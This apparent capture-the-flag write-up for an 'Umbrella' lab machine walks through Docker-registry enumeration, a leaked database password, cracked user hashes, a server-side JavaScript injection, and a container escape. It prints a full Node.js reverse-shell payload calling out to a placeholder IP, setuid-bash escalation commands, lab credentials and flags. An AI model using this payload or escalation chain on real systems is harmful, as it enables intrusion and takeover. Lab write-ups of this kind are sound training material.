# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 22 | SSH |
| 3306 | MYSQL |
| 5000 | HTTP |
| 8080 | HTTP |

```
PORT STATE SERVICE REASON VERSION
22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 f0:14:2f:d6:f6:76:8c:58:9a:8e:84:6a:b1:fb:b9:9f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDafqZxGEa6kz/5SjDuHy4Hs02Ns+hQgiygUqck+jWWnO7A8+mzFovIR0z76dugf8sTv9P6hq++1nNkPvvdovIkCQ00Ci9VrNyRePh9ZjXUf6ohbRLa9bJ45zHSY3Icf56IeuIy3TVn6d05ed5EtaTjAYA8KyCvwm2nDZQ7DH081jnL1g1uJ4aeeA/IlNXYLV610u7lkQem8VwXQWEs7F8JH6RMX8/8oGe7oBnpvKUeACtB9NXN/5tGsiMXqx7+JB8nfpMRIyLiXA7HjV9S7mmtmBduJ5EyfvX5hdwSCEYF1E7/YowqF5KbTpmZeDI9vJharuKqB97iu1h87u1qc37zT7emxD0QxCOAT3mKGXB26u159ZjAvjJ2EUhSjfbgjTx0s0w2bysXJNrpw5oS1AMm/XD6dSCRfg0kS2LzwDFJvv3dCy56bdOdW+Xe/tkBgvNio11OiP8E2qvdZ+cSgnXi+d8m2TkFUJEfavQPES7iXuZ3gMEaVPdbILVz3zRGh58=
| 256 8a:52:f1:d6:ea:6d:18:b2:6f:26:ca:89:87:c9:49:6d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBASqbHaEEuWmI5CrkNyO/jnEdfqh2rz9z2bGFBDGoHjs5kyxBKyXoDSq/WBp7fdyvo1tzZdZfJ06LAk5br00eTg=
| 256 4b:0d:62:2a:79:5c:a0:7b:c4:f4:6c:76:3c:22:7f:f9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDDy2RWM3VB9ZBVO+OjouqVM+inQcilcbI0eM3GAjnoC
3306/tcp open mysql syn-ack MySQL 5.7.40
| ssl-cert: Subject: commonName=MySQL_Server_5.7.40_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_5.7.40_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-12-22T10:04:49
| Not valid after: 2032-12-19T10:04:49
| MD5: c512:bd8c:75b6:afa8:fde3:bc14:0f3e:7764
| SHA-1: 8f11:0b77:1387:0438:fc69:658a:eb43:1671:715c:d421
| -----BEGIN CERTIFICATE-----
| MIIDBzCCAe+gAwIBAgIBAjANBgkqhkiG9w0BAQsFADA8MTowOAYDVQQDDDFNeVNR
| TF9TZXJ2ZXJfNS43LjQwX0F1dG9fR2VuZXJhdGVkX0NBX0NlcnRpZmljYXRlMB4X
| DTIyMTIyMjEwMDQ0OVoXDTMyMTIxOTEwMDQ0OVowQDE+MDwGA1UEAww1TXlTUUxf
| U2VydmVyXzUuNy40MF9BdXRvX0dlbmVyYXRlZF9TZXJ2ZXJfQ2VydGlmaWNhdGUw
| ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC8KqoE91ydQZJDUqWE/nfs
| 6akfHB2g3D1VJoX+DeuTxEubjmWy+jGOepvEbKEhjrLMl9+LIj3vkKlj1bpRw0x1
| 7tbY7NXPtz5EsOCqDcuGl8XjIBE6ck+4yK8jmzgCMOHhJjoAtcsgAOcnal0WCCyB
| 7IS4uvHi7RSHKPrcAf9wgL5sUZylaH1HWiPXDd0141fVVpAtkkdjOUCPwZtF5MKC
| W6gOfgxMsvYoqY0dEHW2LAh+gw10nZsJ/xm9P0s4uWLKrYmHRuub+CC2U5fs5eOk
| mjIk8ypRfP5mdUK3yLWkGwGbq1D0W90DzmHhjhPm96uEOvaomvIK9cHzmtZHRe1r
| AgMBAAGjEDAOMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQELBQADggEBAGkpBg5j
| bdmgMd30Enh8u8/Z7L4N6IalbBCzYhSkaAGrWYh42FhFkd9aAsnbawK+lWWEsMlY
| +arjrwD0TE6XzwvfdYsVwOdARPAwm4Xe3odcisBvySAeOE6laaCnIWnpH/OqGDEk
| GBYfI8+e0CBdjhDNpeWVJEkGv4tzaf6KE1Ix9N2tTF/qCZtmHoOyXQQ7YwBPMRLu
| WnmAdmtDYqVEcuHj106v40QvUMKeFgpFH37M+Lat8y3Nn+11BP5QzRLh+GFuQmVc
| XaDxVdWXCUMWsbaPNNS+NM9FT7WNkH7xTy2NuBdSFvl88tXNZpnz8nkRxXLarLD8
| 2AE6mQqpFHhaSRg=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| mysql-info:
| Protocol: 10
| Version: 5.7.40
| Thread ID: 6
| Capabilities flags: 65535
| Some Capabilities: InteractiveClient, LongColumnFlag, SupportsTransactions, IgnoreSigpipes, ODBCClient, SwitchToSSLAfterHandshake, ConnectWithDatabase, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, Support41Auth, FoundRows, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsCompression, SupportsLoadDataLocal, LongPassword, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
| Status: Autocommit
| Salt: LU\l#L{N(L\x15PM	\x0Dhp#\x1B|
|_ Auth Plugin Name: mysql_native_password
5000/tcp open http syn-ack Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
8080/tcp open http syn-ack Node.js (Express middleware)
|_http-title: Login
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# RECONNAISSANCE
---

If we check the website on port `8080`, we can see this:


![Pasted image 20250423122152.png](../../IMAGES/Pasted%20image%2020250423122152.png)

We can notice a login page, since we don't have credentials yet, it would be nice to go with the other port the `5000` one.

On here, we got something called `Docker Registry`, let's investigate about this:

HackTricks: https://hacktricks.boitatech.com.br/pentesting/5000-pentesting-docker-registry


![Pasted image 20250423122529.png](../../IMAGES/Pasted%20image%2020250423122529.png)


Based on the information on `HackTricks`, we can start applying some techniques, let's do it:

1. List Available Images:

```
curl http://10.10.98.46:5000/v2/_catalog
```

![Pasted image 20250423123322.png](../../IMAGES/Pasted%20image%2020250423123322.png)

We can keep on doing the enumeration:

2. List tags for the repository:

```json
curl http://10.10.98.46:5000/v2/umbrella/timetracking/tags/list
{"name":"umbrella/timetracking","tags":["latest"]}
```


3. Fetch the image manifest:
```json
curl -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
 http://10.10.98.46:5000/v2/umbrella/timetracking/manifests/latest | jq
{
 "schemaVersion": 2,
 "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
 "config": {
 "mediaType": "application/vnd.docker.container.image.v1+json",
 "size": 9237,
 "digest": "sha256:7843f102a2fcb44f83d52a49afaff3af44e2b59793fbd06c21d235395588a286"
 },
 "layers": [
 {
 "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
 "size": 31396943,
 "digest": "sha256:3f4ca61aafcd4fc07267a105067db35c0f0ac630e1970f3cd0c7bf552780e985"
 },
 {
 "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
 "size": 4183,
 "digest": "sha256:00fde01815c92cc90586fcf531723ab210577a0f1cb1600f08d9f8e12c18f108"
 },
 {
 "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
 "size": 46229048,
 "digest": "sha256:a3241ece5841b2e29213eb450a1b29385bf9e0063c37978253c98ff517e6e1b3"
 },
 {
 "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
 "size": 2765481,
 "digest": "sha256:f897be510228b2f804fc2cb5d04cddae2e5689cbede553fb2d587c54be0ba762"
 },
 {
 "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
 "size": 450,
 "digest": "sha256:23e2f216e8246d20ed3271ad109cec07f2a00b17bef8529708d8ae86100c7e03"
 },
 {
 "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
 "size": 165,
 "digest": "sha256:15b79dac86ef36668f382565f91d1667f7a6fc876a3b58b508b6778d8ed71c0e"
 },
 {
 "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
 "size": 14031,
 "digest": "sha256:7fbf137cf91ff826f2b2fddf3a30ea2e3d2e62d17525b708fd76db392e58df62"
 },
 {
 "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
 "size": 2864160,
 "digest": "sha256:e5e56a29478cdf60132aa574648135a89299151414b465942a569f2109eefa65"
 },
 {
 "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
 "size": 1078,
 "digest": "sha256:82f3f98b46d4129f725cab6326d0521589d5b75ae0a480256495d216b2cd9216"
 },
 {
 "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
 "size": 973,
 "digest": "sha256:62c454461c50ff8fb0d1c5d5ad8146203bb4505b30b9c27e6f05461b6d07edcb"
 },
 {
 "mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",
 "size": 1428,
 "digest": "sha256:c9124d8ccff258cf42f1598eae732c3f530bf4cdfbd7c4cd7b235dfae2e0a549"
 }
 ]
}
```

We got the config file `digest`, we can use this to get the `config.json` file:

```
curl http://10.10.98.46:5000/v2/umbrella/timetracking/blobs/sha256:7843f102a2fcb44f83d52a49afaff3af44e2b59793fbd06c21d235395588a286 -o config.json
```

If we analyze the configuration file, we can find this at the `Env` section:

```bash
"Env": [
 "DB_HOST=db",
 "DB_USER=root",
 "DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5", 
 "DB_DATABASE=timetracking",
 "LOG_FILE=/logs/tt.log"
]
```


As we can see, we got the db password, we can use it at port `3306`, let's proceed exploitation.

# EXPLOITATION
---

Let's use the password:

```
mysql -h umbrella.thm -D timetracking -u root -p --skip-ssl
```


We can use our password and notice this:


```
MySQL [timetracking]> show tables;
+------------------------+
| Tables_in_timetracking |
+------------------------+
| users |
+------------------------+
1 row in set (0.157 sec)

MySQL [timetracking]> select * from users;
+----------+----------------------------------+-------+
| user | pass | time |
+----------+----------------------------------+-------+
| claire-r | 2ac9cb7dc02b3c0083eb70898e549b63 | 360 |
| chris-r | 0d107d09f5bbe40cade3de5c71e9e9b7 | 420 |
| jill-v | d5c0607301ad5d5c1528962a83992ac8 | 564 |
| barry-b | 4a04890400b5d7bac101baace5d7e994 | 47893 |
+----------+----------------------------------+-------+
4 rows in set (0.156 sec)

MySQL [timetracking]>
```

We got some users and `md5` hashes, let's crack them all, we can maybe use some of them at port `8080`:

![Pasted image 20250423125155.png](../../IMAGES/Pasted%20image%2020250423125155.png)

```
claire-r:Password1
chris-r:letmein
jill-v:sunshine1
barry-b:sandwich
```

If we log in with any user, we can see this:

![Pasted image 20250423125421.png](../../IMAGES/Pasted%20image%2020250423125421.png)

That time increase spent functionality seems weird, this may be vulnerable to some injection like `SSTI` or `SSJI`, this message is weird:

```
Pro Tip: You can also use mathematical expressions, e.g. 5+4
```

If we try:

```
{{config}}
```

We get the following output:

![Pasted image 20250423125957.png](../../IMAGES/Pasted%20image%2020250423125957.png)

This error indicates the application is vulnerable to `SSJI (Server Side Javascript Injection)`, we can test some payload to check if it actually works:

```
1; 7*7
```

If the timer of our user get's increased by `49`, we can visualize it is indeed vulnerable:

![Pasted image 20250423130155.png](../../IMAGES/Pasted%20image%2020250423130155.png)


![Pasted image 20250423130203.png](../../IMAGES/Pasted%20image%2020250423130203.png)

It worked, let's try some `RCE`, we can get a reverse shell with this command:

```js
(function(){ 
 var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); 
 var client = new net.Socket(); 
 client.connect(4444, "YOUR_IP", function(){ 
 client.pipe(sh.stdin); 
 sh.stdout.pipe(client); 
 sh.stderr.pipe(client); 
 }); 
 return /a/; 
})();
```

Let's start our listener and send it:

![Pasted image 20250423132106.png](../../IMAGES/Pasted%20image%2020250423132106.png)


Let's begin privilege escalation.


# PRIVILEGE ESCALATION
---

We can start by stabilizing our shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

We are inside of a docker container:

![Pasted image 20250423132743.png](../../IMAGES/Pasted%20image%2020250423132743.png)

We need some way to escalate into the root of the host machine, if we remember the `/` directory contains a `logs` directory, let's check it out:


![Pasted image 20250423133506.png](../../IMAGES/Pasted%20image%2020250423133506.png)

We got a log called `tt.log`, it may be linked to an user in the host machine, let's try using the credentials we found on the database on ssh to check if it's true:


![Pasted image 20250423133641.png](../../IMAGES/Pasted%20image%2020250423133641.png)

As we can see, it is owned by root and linked to `/home/claire-r/timeTracker-src/logs`, we can exploit this to break out of the docker container in the following way:

1. Let's create a test file inside of that directory as `claire-r` to check that we are actually inside the same directory:

```bash
echo 'Test' >> /home/claire-r/timeTracker-src/logs/test.txt
```

![Pasted image 20250423133855.png](../../IMAGES/Pasted%20image%2020250423133855.png)

If we check our root connection on the docker container:

![Pasted image 20250423133914.png](../../IMAGES/Pasted%20image%2020250423133914.png)

As seen, we are indeed sharing the same `logs` directory, we can now perform a technique in which we copy the contents of `/bin/bash` and put it inside of the shared directory:

```bash
cp /bin/bash /home/claire-r/timeTracker-src/logs/ # This needs to be done at claire-r ssh
```

Now, on our root shell:

```bash
chown root:root /logs/bash
chmod 4777 /logs/bash
```

Back in our ssh session:

```bash
/home/claire-r/timeTracker-src/logs/bash -p
```

![Pasted image 20250423134230.png](../../IMAGES/Pasted%20image%2020250423134230.png)

There we go, we were able to become root on the host machine, let's read all flags and finish the CTF:

```
bash-5.0# cat /home/claire-r/user.txt
THM{d832c0e4cf71312708686124f7a6b25e}
```

```
bash-5.0# cat /root/root.txt
THM{1e15fbe7978061c6bb1924124fd9eab2}
```

![Pasted image 20250423134335.png](../../IMAGES/Pasted%20image%2020250423134335.png)

